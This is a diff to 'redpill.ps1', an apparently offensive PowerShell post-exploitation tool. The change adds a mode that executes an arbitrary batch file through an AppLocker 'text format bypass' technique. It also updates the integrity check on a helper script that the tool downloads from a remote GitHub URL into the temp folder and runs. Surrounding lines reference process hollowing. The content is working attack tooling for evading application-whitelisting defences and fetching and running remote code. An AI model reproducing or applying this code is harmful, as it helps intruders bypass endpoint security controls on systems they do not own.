@@ -1937,7 +1937,7 @@ If($PEHollow -ne "false"){
    If(Test-Path -Path "$Env:TMP\Start-Hollow.ps1"){Remove-Item -Path "$Env:TMP\Start-Hollow.ps1" -Force}
 }
 
-if($AppLocker -ieq "Enum" -or $AppLocker -ieq "WhoAmi" -or $AppLocker -ieq "TestBat"){
+if($AppLocker -ieq "Enum" -or $AppLocker -ieq "WhoAmi" -or $AppLocker -ieq "TestBat" -or $AppLocker -Match '\\'){
 
    <#
    .SYNOPSIS
@@ -1960,6 +1960,10 @@ if($AppLocker -ieq "Enum" -or $AppLocker -ieq "WhoAmi" -or $AppLocker -ieq "Test
    .EXAMPLE
       PS C:\> Powershell -File redpill.ps1 -AppLocker TestBat
       Test for AppLocker Batch Script Execution Restriction bypass
+
+   .EXAMPLE
+      PS C:\> Powershell -File redpill.ps1 -AppLocker "$Env:TMP\applock.bat"
+      Execute applock.bat through text format bypass tecnic
 
    .EXAMPLE
       PS C:\> Powershell -File redpill.ps1 -AppLocker Enum -GroupName "BUILTIN\Users" -FolderRigths "Write"
@@ -1988,7 +1992,7 @@ if($AppLocker -ieq "Enum" -or $AppLocker -ieq "WhoAmi" -or $AppLocker -ieq "Test
       Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/AppLocker.ps1 -Destination $Env:TMP\AppLocker.ps1 -ErrorAction SilentlyContinue|Out-Null
       ## Check downloaded file integrity => FileSizeKBytes
       $SizeDump = ((Get-Item -Path "$Env:TMP\AppLocker.ps1" -EA SilentlyContinue).length/1KB)
-      If($SizeDump -lt 13){## Corrupted download detected => DefaultFileSize: 13,5458984375/KB
+      If($SizeDump -lt 17){## Corrupted download detected => DefaultFileSize: 17,2255859375/KB
          Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
          If(Test-Path -Path "$Env:TMP\AppLocker.ps1"){Remove-Item -Path "$Env:TMP\AppLocker.ps1" -Force}
          Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
@@ -2002,6 +2006,8 @@ if($AppLocker -ieq "Enum" -or $AppLocker -ieq "WhoAmi" -or $AppLocker -ieq "Test
        powershell -File "$Env:TMP\AppLocker.ps1" -GroupName "$GroupName" -FolderRigths "$FolderRigths"
    }ElseIf($AppLocker -ieq "TestBat"){
        powershell -File "$Env:TMP\AppLocker.ps1" -TestBat TestBypass
+   }ElseIf($AppLocker -Match '\\'){
+       powershell -File "$Env:TMP\AppLocker.ps1" -TestBat "$AppLocker"
    }
 
    ## Clean Old files left behind
@@ -3364,6 +3370,10 @@ $HelpParameters = @"
    .EXAMPLE
       PS C:\> Powershell -File redpill.ps1 -AppLocker TestBat
       Test for AppLocker Batch Script Execution Restriction bypass
+
+   .EXAMPLE
+      PS C:\> Powershell -File redpill.ps1 -AppLocker "`$Env:TMP\applock.bat"
+      Execute applock.bat through text format bypass tecnic
 
    .EXAMPLE
       PS C:\> Powershell -File redpill.ps1 -AppLocker Enum -GroupName "BUILTIN\Users" -FolderRigths "Write"
